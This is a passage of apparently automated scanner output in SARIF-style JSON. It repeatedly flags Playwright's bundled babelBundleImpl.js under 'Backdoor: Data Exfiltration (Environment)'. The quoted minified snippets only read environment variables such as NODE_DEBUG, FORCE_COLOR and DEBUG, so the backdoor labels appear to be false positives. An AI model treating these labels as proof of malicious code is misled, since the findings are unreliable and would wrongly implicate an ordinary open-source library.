                      "markdown": "`ingSpecifiers:n,exportName:s}=e;return Tpe(t.reduce((i,a)=>{let o={EXPORTS:s,NAME:a,VALUE:i};return a===\"__proto__\"?W0.define(o):n.has(a)?W0.computed(o):W0.default(o)},r))}});var qn=E((ke,i2)=>{ke=i2.exports=Ue;var gt;typeof process==\"object\"&&process.env&&process.env.NODE_DEBUG&&/\\bsemver\\b/i.test(process.env.NODE_DEBUG)?gt=function(){var e=Array.prototype.slice.call(arguments,0);e.unshift(\"SEMVER\"),console.log.apply(console,e)}:gt=function(){};ke.SEMVER_SPEC_VERSION=\"2.0.0\";var Vo=256,Ac=Number.MAX_SAFE_INTEGER||9007199254740991,H0=16,Fpe=Vo-6,aa=ke.re=[],yt=ke.safeRe=[],H=ke.src=[],U=ke.tokens={},n2=0`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1695,
                  "startColumn": 1729,
                  "endLine": 1695,
                  "endColumn": 1740,
                  "snippet": {
                    "text": "NAME\"] = VALUE`};function K0(e,t,r){let{stringSpecifiers:n,exportName:s}=e;return Tpe(t.reduce((i,a)=>{let o={EXPORTS:s,NAME:a,VALUE:i};return a===\"__proto__\"?W0.define(o):n.has(a)?W0.computed(o):W0.default(o)},r))}});var qn=E((ke,i2)=>{ke=i2.exports=Ue;var gt;typeof process==\"object\"&&process.env&&process.env.NODE_DEBUG&&/\\bsemver\\b/i.test(process.env.NODE_DEBUG)?gt=function(){var e=Array.prototype.slice.call(arguments,0);e.unshift(\"SEMVER\"),console.log.apply(console,e)}:gt=function(){};ke.SEMVER_SPEC_VERSION=\"2.0.0\";var Vo=256,Ac=Number.MAX_SAFE_INTEGER||9007199254740991,H0=16,Fpe=Vo-6,aa=ke.re=[],yt=k",
                    "rendered": {
                      "text": "NAME\"] = VALUE`};function K0(e,t,r){let{stringSpecifiers:n,exportName:s}=e;return Tpe(t.reduce((i,a)=>{let o={EXPORTS:s,NAME:a,VALUE:i};return a===\"__proto__\"?W0.define(o):n.has(a)?W0.computed(o):W0.default(o)},r))}});var qn=E((ke,i2)=>{ke=i2.exports=Ue;var gt;typeof process==\"object\"&&process.env&&process.env.NODE_DEBUG&&/\\bsemver\\b/i.test(process.env.NODE_DEBUG)?gt=function(){var e=Array.prototype.slice.call(arguments,0);e.unshift(\"SEMVER\"),console.log.apply(console,e)}:gt=function(){};ke.SEMVER_SPEC_VERSION=\"2.0.0\";var Vo=256,Ac=Number.MAX_SAFE_INTEGER||9007199254740991,H0=16,Fpe=Vo-6,aa=ke.re=[],yt=k",
                      "markdown": "`NAME\"] = VALUE`};function K0(e,t,r){let{stringSpecifiers:n,exportName:s}=e;return Tpe(t.reduce((i,a)=>{let o={EXPORTS:s,NAME:a,VALUE:i};return a===\"__proto__\"?W0.define(o):n.has(a)?W0.computed(o):W0.default(o)},r))}});var qn=E((ke,i2)=>{ke=i2.exports=Ue;var gt;typeof process==\"object\"&&process.env&&process.env.NODE_DEBUG&&/\\bsemver\\b/i.test(process.env.NODE_DEBUG)?gt=function(){var e=Array.prototype.slice.call(arguments,0);e.unshift(\"SEMVER\"),console.log.apply(console,e)}:gt=function(){};ke.SEMVER_SPEC_VERSION=\"2.0.0\";var Vo=256,Ac=Number.MAX_SAFE_INTEGER||9007199254740991,H0=16,Fpe=Vo-6,aa=ke.re=[],yt=k`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1695,
                  "startColumn": 1716,
                  "endLine": 1695,
                  "endColumn": 1727,
                  "snippet": {
                    "text": "le: true })[\"NAME\"] = VALUE`};function K0(e,t,r){let{stringSpecifiers:n,exportName:s}=e;return Tpe(t.reduce((i,a)=>{let o={EXPORTS:s,NAME:a,VALUE:i};return a===\"__proto__\"?W0.define(o):n.has(a)?W0.computed(o):W0.default(o)},r))}});var qn=E((ke,i2)=>{ke=i2.exports=Ue;var gt;typeof process==\"object\"&&process.env&&process.env.NODE_DEBUG&&/\\bsemver\\b/i.test(process.env.NODE_DEBUG)?gt=function(){var e=Array.prototype.slice.call(arguments,0);e.unshift(\"SEMVER\"),console.log.apply(console,e)}:gt=function(){};ke.SEMVER_SPEC_VERSION=\"2.0.0\";var Vo=256,Ac=Number.MAX_SAFE_INTEGER||9007199254740991,H0=16,Fpe=Vo-6,aa=",
                    "rendered": {
                      "text": "le: true })[\"NAME\"] = VALUE`};function K0(e,t,r){let{stringSpecifiers:n,exportName:s}=e;return Tpe(t.reduce((i,a)=>{let o={EXPORTS:s,NAME:a,VALUE:i};return a===\"__proto__\"?W0.define(o):n.has(a)?W0.computed(o):W0.default(o)},r))}});var qn=E((ke,i2)=>{ke=i2.exports=Ue;var gt;typeof process==\"object\"&&process.env&&process.env.NODE_DEBUG&&/\\bsemver\\b/i.test(process.env.NODE_DEBUG)?gt=function(){var e=Array.prototype.slice.call(arguments,0);e.unshift(\"SEMVER\"),console.log.apply(console,e)}:gt=function(){};ke.SEMVER_SPEC_VERSION=\"2.0.0\";var Vo=256,Ac=Number.MAX_SAFE_INTEGER||9007199254740991,H0=16,Fpe=Vo-6,aa=",
                      "markdown": "`le: true })[\"NAME\"] = VALUE`};function K0(e,t,r){let{stringSpecifiers:n,exportName:s}=e;return Tpe(t.reduce((i,a)=>{let o={EXPORTS:s,NAME:a,VALUE:i};return a===\"__proto__\"?W0.define(o):n.has(a)?W0.computed(o):W0.default(o)},r))}});var qn=E((ke,i2)=>{ke=i2.exports=Ue;var gt;typeof process==\"object\"&&process.env&&process.env.NODE_DEBUG&&/\\bsemver\\b/i.test(process.env.NODE_DEBUG)?gt=function(){var e=Array.prototype.slice.call(arguments,0);e.unshift(\"SEMVER\"),console.log.apply(console,e)}:gt=function(){};ke.SEMVER_SPEC_VERSION=\"2.0.0\";var Vo=256,Ac=Number.MAX_SAFE_INTEGER||9007199254740991,H0=16,Fpe=Vo-6,aa=`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 20,
                  "startColumn": 1227,
                  "endLine": 20,
                  "endColumn": 1238,
                  "snippet": {
                    "text": "pertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var a=s?Object.getOwnPropertyDescriptor(e,i):null;a&&(a.get||a.set)?Object.defineProperty(n,i,a):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}var ese=typeof process==\"object\"&&(process.env.FORCE_COLOR===\"0\"||process.env.FORCE_COLOR===\"false\")?(0,sy.createColors)(!1):sy.default,IP=(e,t)=>r=>e(t(r)),ny;function tse(e){if(e){var t;return(t=ny)!=null||(ny=(0,sy.createColors)(!0)),ny}return ese}var OP=!1;function rse(e){return{gutter:e.gray,marker:IP(e.red,e.bold),message:IP(e.red,e.bold)}}var _P=/\\r\\n|[\\n\\r\\u2028\\u202",
                    "rendered": {
                      "text": "pertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var a=s?Object.getOwnPropertyDescriptor(e,i):null;a&&(a.get||a.set)?Object.defineProperty(n,i,a):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}var ese=typeof process==\"object\"&&(process.env.FORCE_COLOR===\"0\"||process.env.FORCE_COLOR===\"false\")?(0,sy.createColors)(!1):sy.default,IP=(e,t)=>r=>e(t(r)),ny;function tse(e){if(e){var t;return(t=ny)!=null||(ny=(0,sy.createColors)(!0)),ny}return ese}var OP=!1;function rse(e){return{gutter:e.gray,marker:IP(e.red,e.bold),message:IP(e.red,e.bold)}}var _P=/\\r\\n|[\\n\\r\\u2028\\u202",
                      "markdown": "`pertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var a=s?Object.getOwnPropertyDescriptor(e,i):null;a&&(a.get||a.set)?Object.defineProperty(n,i,a):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}var ese=typeof process==\"object\"&&(process.env.FORCE_COLOR===\"0\"||process.env.FORCE_COLOR===\"false\")?(0,sy.createColors)(!1):sy.default,IP=(e,t)=>r=>e(t(r)),ny;function tse(e){if(e){var t;return(t=ny)!=null||(ny=(0,sy.createColors)(!0)),ny}return ese}var OP=!1;function rse(e){return{gutter:e.gray,marker:IP(e.red,e.bold),message:IP(e.red,e.bold)}}var _P=/\\r\\n|[\\n\\r\\u2028\\u202`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 20,
                  "startColumn": 1196,
                  "endLine": 20,
                  "endColumn": 1207,
                  "snippet": {
                    "text": "efineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var a=s?Object.getOwnPropertyDescriptor(e,i):null;a&&(a.get||a.set)?Object.defineProperty(n,i,a):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}var ese=typeof process==\"object\"&&(process.env.FORCE_COLOR===\"0\"||process.env.FORCE_COLOR===\"false\")?(0,sy.createColors)(!1):sy.default,IP=(e,t)=>r=>e(t(r)),ny;function tse(e){if(e){var t;return(t=ny)!=null||(ny=(0,sy.createColors)(!0)),ny}return ese}var OP=!1;function rse(e){return{gutter:e.gray,marker:IP(e.red,e.bold),message:IP(e.red,e.bold)",
                    "rendered": {
                      "text": "efineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var a=s?Object.getOwnPropertyDescriptor(e,i):null;a&&(a.get||a.set)?Object.defineProperty(n,i,a):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}var ese=typeof process==\"object\"&&(process.env.FORCE_COLOR===\"0\"||process.env.FORCE_COLOR===\"false\")?(0,sy.createColors)(!1):sy.default,IP=(e,t)=>r=>e(t(r)),ny;function tse(e){if(e){var t;return(t=ny)!=null||(ny=(0,sy.createColors)(!0)),ny}return ese}var OP=!1;function rse(e){return{gutter:e.gray,marker:IP(e.red,e.bold),message:IP(e.red,e.bold)",
                      "markdown": "`efineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var a=s?Object.getOwnPropertyDescriptor(e,i):null;a&&(a.get||a.set)?Object.defineProperty(n,i,a):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}var ese=typeof process==\"object\"&&(process.env.FORCE_COLOR===\"0\"||process.env.FORCE_COLOR===\"false\")?(0,sy.createColors)(!1):sy.default,IP=(e,t)=>r=>e(t(r)),ny;function tse(e){if(e){var t;return(t=ny)!=null||(ny=(0,sy.createColors)(!0)),ny}return ese}var OP=!1;function rse(e){return{gutter:e.gray,marker:IP(e.red,e.bold),message:IP(e.red,e.bold)`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 5097,
                  "endLine": 19,
                  "endColumn": 5108,
                  "snippet": {
                    "text": "opertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var a=s?Object.getOwnPropertyDescriptor(e,i):null;a&&(a.get||a.set)?Object.defineProperty(n,i,a):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}var PP=typeof process==\"object\"&&(process.env.FORCE_COLOR===\"0\"||process.env.FORCE_COLOR===\"false\")?(0,ry.createColors)(!1):ry.default,SP=(e,t)=>r=>e(t(r)),Gne=new Set([\"as\",\"async\",\"from\",\"get\",\"of\",\"set\"]);function Hne(e){return{keyword:e.cyan,capitalized:e.yellow,jsxIdentifier:e.yellow,punctuator:e.yellow,number:e.magenta,string:e.green,regex:e.magenta,comment:e.gray,inv",
                    "rendered": {
                      "text": "opertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var a=s?Object.getOwnPropertyDescriptor(e,i):null;a&&(a.get||a.set)?Object.defineProperty(n,i,a):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}var PP=typeof process==\"object\"&&(process.env.FORCE_COLOR===\"0\"||process.env.FORCE_COLOR===\"false\")?(0,ry.createColors)(!1):ry.default,SP=(e,t)=>r=>e(t(r)),Gne=new Set([\"as\",\"async\",\"from\",\"get\",\"of\",\"set\"]);function Hne(e){return{keyword:e.cyan,capitalized:e.yellow,jsxIdentifier:e.yellow,punctuator:e.yellow,number:e.magenta,string:e.green,regex:e.magenta,comment:e.gray,inv",
                      "markdown": "`opertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var a=s?Object.getOwnPropertyDescriptor(e,i):null;a&&(a.get||a.set)?Object.defineProperty(n,i,a):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}var PP=typeof process==\"object\"&&(process.env.FORCE_COLOR===\"0\"||process.env.FORCE_COLOR===\"false\")?(0,ry.createColors)(!1):ry.default,SP=(e,t)=>r=>e(t(r)),Gne=new Set([\"as\",\"async\",\"from\",\"get\",\"of\",\"set\"]);function Hne(e){return{keyword:e.cyan,capitalized:e.yellow,jsxIdentifier:e.yellow,punctuator:e.yellow,number:e.magenta,string:e.green,regex:e.magenta,comment:e.gray,inv`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 5066,
                  "endLine": 19,
                  "endColumn": 5077,
                  "snippet": {
                    "text": "defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var a=s?Object.getOwnPropertyDescriptor(e,i):null;a&&(a.get||a.set)?Object.defineProperty(n,i,a):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}var PP=typeof process==\"object\"&&(process.env.FORCE_COLOR===\"0\"||process.env.FORCE_COLOR===\"false\")?(0,ry.createColors)(!1):ry.default,SP=(e,t)=>r=>e(t(r)),Gne=new Set([\"as\",\"async\",\"from\",\"get\",\"of\",\"set\"]);function Hne(e){return{keyword:e.cyan,capitalized:e.yellow,jsxIdentifier:e.yellow,punctuator:e.yellow,number:e.magenta,string:e.green,reg",
                    "rendered": {
                      "text": "defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var a=s?Object.getOwnPropertyDescriptor(e,i):null;a&&(a.get||a.set)?Object.defineProperty(n,i,a):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}var PP=typeof process==\"object\"&&(process.env.FORCE_COLOR===\"0\"||process.env.FORCE_COLOR===\"false\")?(0,ry.createColors)(!1):ry.default,SP=(e,t)=>r=>e(t(r)),Gne=new Set([\"as\",\"async\",\"from\",\"get\",\"of\",\"set\"]);function Hne(e){return{keyword:e.cyan,capitalized:e.yellow,jsxIdentifier:e.yellow,punctuator:e.yellow,number:e.magenta,string:e.green,reg",
                      "markdown": "`defineProperty&&Object.getOwnPropertyDescriptor;for(var i in e)if(i!==\"default\"&&Object.prototype.hasOwnProperty.call(e,i)){var a=s?Object.getOwnPropertyDescriptor(e,i):null;a&&(a.get||a.set)?Object.defineProperty(n,i,a):n[i]=e[i]}return n.default=e,r&&r.set(e,n),n}var PP=typeof process==\"object\"&&(process.env.FORCE_COLOR===\"0\"||process.env.FORCE_COLOR===\"false\")?(0,ry.createColors)(!1):ry.default,SP=(e,t)=>r=>e(t(r)),Gne=new Set([\"as\",\"async\",\"from\",\"get\",\"of\",\"set\"]);function Hne(e){return{keyword:e.cyan,capitalized:e.yellow,jsxIdentifier:e.yellow,punctuator:e.yellow,number:e.magenta,string:e.green,reg`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 1551,
                  "endLine": 19,
                  "endColumn": 1562,
                  "snippet": {
                    "text": ")}else s.push(c)}),n.push(s.join(\"\")),r.length>0){let i=`Chalk template literal is missing ${r.length} closing bracket${r.length===1?\"\":\"s\"} (\\`}\\`)`;throw new Error(i)}return n.join(\"\")}});var EP=E((u2e,po)=>{\"use strict\";var ey=zx(),Ut=uP(),Zm=rm().stdout,Une=hP(),yP=process.platform===\"win32\"&&!(process.env.TERM||\"\").toLowerCase().startsWith(\"xterm\"),gP=[\"ansi\",\"ansi\",\"ansi256\",\"ansi16m\"],bP=new Set([\"gray\"]),Gi=Object.create(null);function mP(e,t){t=t||{};let r=Zm?Zm.level:0;e.level=t.level===void 0?r:t.level,e.enabled=\"enabled\"in t?t.enabled:e.level>0}function fo(e){if(!this||!(this instanceof fo)||",
                    "rendered": {
                      "text": ")}else s.push(c)}),n.push(s.join(\"\")),r.length>0){let i=`Chalk template literal is missing ${r.length} closing bracket${r.length===1?\"\":\"s\"} (\\`}\\`)`;throw new Error(i)}return n.join(\"\")}});var EP=E((u2e,po)=>{\"use strict\";var ey=zx(),Ut=uP(),Zm=rm().stdout,Une=hP(),yP=process.platform===\"win32\"&&!(process.env.TERM||\"\").toLowerCase().startsWith(\"xterm\"),gP=[\"ansi\",\"ansi\",\"ansi256\",\"ansi16m\"],bP=new Set([\"gray\"]),Gi=Object.create(null);function mP(e,t){t=t||{};let r=Zm?Zm.level:0;e.level=t.level===void 0?r:t.level,e.enabled=\"enabled\"in t?t.enabled:e.level>0}function fo(e){if(!this||!(this instanceof fo)||",
                      "markdown": "`)}else s.push(c)}),n.push(s.join(\"\")),r.length>0){let i=`Chalk template literal is missing ${r.length} closing bracket${r.length===1?\"\":\"s\"} (\\`}\\`)`;throw new Error(i)}return n.join(\"\")}});var EP=E((u2e,po)=>{\"use strict\";var ey=zx(),Ut=uP(),Zm=rm().stdout,Une=hP(),yP=process.platform===\"win32\"&&!(process.env.TERM||\"\").toLowerCase().startsWith(\"xterm\"),gP=[\"ansi\",\"ansi\",\"ansi256\",\"ansi16m\"],bP=new Set([\"gray\"]),Gi=Object.create(null);function mP(e,t){t=t||{};let r=Zm?Zm.level:0;e.level=t.level===void 0?r:t.level,e.enabled=\"enabled\"in t?t.enabled:e.level>0}function fo(e){if(!this||!(this instanceof fo)||`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 86,
                  "endLine": 11,
                  "endColumn": 97,
                  "snippet": {
                    "text": "\"m+\"+lu.exports.humanize(this.diff)+\"\\x1B[0m\")}else e[0]=zH()+t+\" \"+e[0]}function zH(){return Xt.inspectOpts.hideDate?\"\":new Date().toISOString()+\" \"}function QH(...e){return process.stderr.write(ou.format(...e)+`\n`)}function ZH(e){e?process.env.DEBUG=e:delete process.env.DEBUG}function eY(){return process.env.DEBUG}function tY(e){e.inspectOpts={};let t=Object.keys(Xt.inspectOpts);for(let r=0;r<t.length;r++)e.inspectOpts[t[r]]=Xt.inspectOpts[t[r]]}lu.exports=em()(Xt);var{formatters:lS}=lu.exports;lS.o=function(e){return this.inspectOpts.colors=this.useColors,ou.inspect(e,this.inspectOpts).split(`\n`).map(",
                    "rendered": {
                      "text": "\"m+\"+lu.exports.humanize(this.diff)+\"\\x1B[0m\")}else e[0]=zH()+t+\" \"+e[0]}function zH(){return Xt.inspectOpts.hideDate?\"\":new Date().toISOString()+\" \"}function QH(...e){return process.stderr.write(ou.format(...e)+`\n`)}function ZH(e){e?process.env.DEBUG=e:delete process.env.DEBUG}function eY(){return process.env.DEBUG}function tY(e){e.inspectOpts={};let t=Object.keys(Xt.inspectOpts);for(let r=0;r<t.length;r++)e.inspectOpts[t[r]]=Xt.inspectOpts[t[r]]}lu.exports=em()(Xt);var{formatters:lS}=lu.exports;lS.o=function(e){return this.inspectOpts.colors=this.useColors,ou.inspect(e,this.inspectOpts).split(`\n`).map(",
                      "markdown": "`\"m+\"+lu.exports.humanize(this.diff)+\"\\x1B[0m\")}else e[0]=zH()+t+\" \"+e[0]}function zH(){return Xt.inspectOpts.hideDate?\"\":new Date().toISOString()+\" \"}function QH(...e){return process.stderr.write(ou.format(...e)+`\n`)}function ZH(e){e?process.env.DEBUG=e:delete process.env.DEBUG}function eY(){return process.env.DEBUG}function tY(e){e.inspectOpts={};let t=Object.keys(Xt.inspectOpts);for(let r=0;r<t.length;r++)e.inspectOpts[t[r]]=Xt.inspectOpts[t[r]]}lu.exports=em()(Xt);var{formatters:lS}=lu.exports;lS.o=function(e){return this.inspectOpts.colors=this.useColors,ou.inspect(e,this.inspectOpts).split(`\n`).map(`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 47,
                  "endLine": 11,
                  "endColumn": 58,
                  "snippet": {
                    "text": "i+e[0].split(`\n`).join(`\n`+i),e.push(s+\"m+\"+lu.exports.humanize(this.diff)+\"\\x1B[0m\")}else e[0]=zH()+t+\" \"+e[0]}function zH(){return Xt.inspectOpts.hideDate?\"\":new Date().toISOString()+\" \"}function QH(...e){return process.stderr.write(ou.format(...e)+`\n`)}function ZH(e){e?process.env.DEBUG=e:delete process.env.DEBUG}function eY(){return process.env.DEBUG}function tY(e){e.inspectOpts={};let t=Object.keys(Xt.inspectOpts);for(let r=0;r<t.length;r++)e.inspectOpts[t[r]]=Xt.inspectOpts[t[r]]}lu.exports=em()(Xt);var{formatters:lS}=lu.exports;lS.o=function(e){return this.inspectOpts.colors=this.useColors,ou.insp",
                    "rendered": {
                      "text": "i+e[0].split(`\n`).join(`\n`+i),e.push(s+\"m+\"+lu.exports.humanize(this.diff)+\"\\x1B[0m\")}else e[0]=zH()+t+\" \"+e[0]}function zH(){return Xt.inspectOpts.hideDate?\"\":new Date().toISOString()+\" \"}function QH(...e){return process.stderr.write(ou.format(...e)+`\n`)}function ZH(e){e?process.env.DEBUG=e:delete process.env.DEBUG}function eY(){return process.env.DEBUG}function tY(e){e.inspectOpts={};let t=Object.keys(Xt.inspectOpts);for(let r=0;r<t.length;r++)e.inspectOpts[t[r]]=Xt.inspectOpts[t[r]]}lu.exports=em()(Xt);var{formatters:lS}=lu.exports;lS.o=function(e){return this.inspectOpts.colors=this.useColors,ou.insp",
                      "markdown": "`i+e[0].split(`\n`).join(`\n`+i),e.push(s+\"m+\"+lu.exports.humanize(this.diff)+\"\\x1B[0m\")}else e[0]=zH()+t+\" \"+e[0]}function zH(){return Xt.inspectOpts.hideDate?\"\":new Date().toISOString()+\" \"}function QH(...e){return process.stderr.write(ou.format(...e)+`\n`)}function ZH(e){e?process.env.DEBUG=e:delete process.env.DEBUG}function eY(){return process.env.DEBUG}function tY(e){e.inspectOpts={};let t=Object.keys(Xt.inspectOpts);for(let r=0;r<t.length;r++)e.inspectOpts[t[r]]=Xt.inspectOpts[t[r]]}lu.exports=em()(Xt);var{formatters:lS}=lu.exports;lS.o=function(e){return this.inspectOpts.colors=this.useColors,ou.insp`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 20,
                  "endLine": 11,
                  "endColumn": 31,
                  "snippet": {
                    "text": " ${s};1m${t} \\x1B[0m`;e[0]=i+e[0].split(`\n`).join(`\n`+i),e.push(s+\"m+\"+lu.exports.humanize(this.diff)+\"\\x1B[0m\")}else e[0]=zH()+t+\" \"+e[0]}function zH(){return Xt.inspectOpts.hideDate?\"\":new Date().toISOString()+\" \"}function QH(...e){return process.stderr.write(ou.format(...e)+`\n`)}function ZH(e){e?process.env.DEBUG=e:delete process.env.DEBUG}function eY(){return process.env.DEBUG}function tY(e){e.inspectOpts={};let t=Object.keys(Xt.inspectOpts);for(let r=0;r<t.length;r++)e.inspectOpts[t[r]]=Xt.inspectOpts[t[r]]}lu.exports=em()(Xt);var{formatters:lS}=lu.exports;lS.o=function(e){return this.inspectOpts.co",
                    "rendered": {
                      "text": " ${s};1m${t} \\x1B[0m`;e[0]=i+e[0].split(`\n`).join(`\n`+i),e.push(s+\"m+\"+lu.exports.humanize(this.diff)+\"\\x1B[0m\")}else e[0]=zH()+t+\" \"+e[0]}function zH(){return Xt.inspectOpts.hideDate?\"\":new Date().toISOString()+\" \"}function QH(...e){return process.stderr.write(ou.format(...e)+`\n`)}function ZH(e){e?process.env.DEBUG=e:delete process.env.DEBUG}function eY(){return process.env.DEBUG}function tY(e){e.inspectOpts={};let t=Object.keys(Xt.inspectOpts);for(let r=0;r<t.length;r++)e.inspectOpts[t[r]]=Xt.inspectOpts[t[r]]}lu.exports=em()(Xt);var{formatters:lS}=lu.exports;lS.o=function(e){return this.inspectOpts.co",
                      "markdown": "` ${s};1m${t} \\x1B[0m`;e[0]=i+e[0].split(`\n`).join(`\n`+i),e.push(s+\"m+\"+lu.exports.humanize(this.diff)+\"\\x1B[0m\")}else e[0]=zH()+t+\" \"+e[0]}function zH(){return Xt.inspectOpts.hideDate?\"\":new Date().toISOString()+\" \"}function QH(...e){return process.stderr.write(ou.format(...e)+`\n`)}function ZH(e){e?process.env.DEBUG=e:delete process.env.DEBUG}function eY(){return process.env.DEBUG}function tY(e){e.inspectOpts={};let t=Object.keys(Xt.inspectOpts);for(let r=0;r<t.length;r++)e.inspectOpts[t[r]]=Xt.inspectOpts[t[r]]}lu.exports=em()(Xt);var{formatters:lS}=lu.exports;lS.o=function(e){return this.inspectOpts.co`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 164946,
                  "endLine": 8,
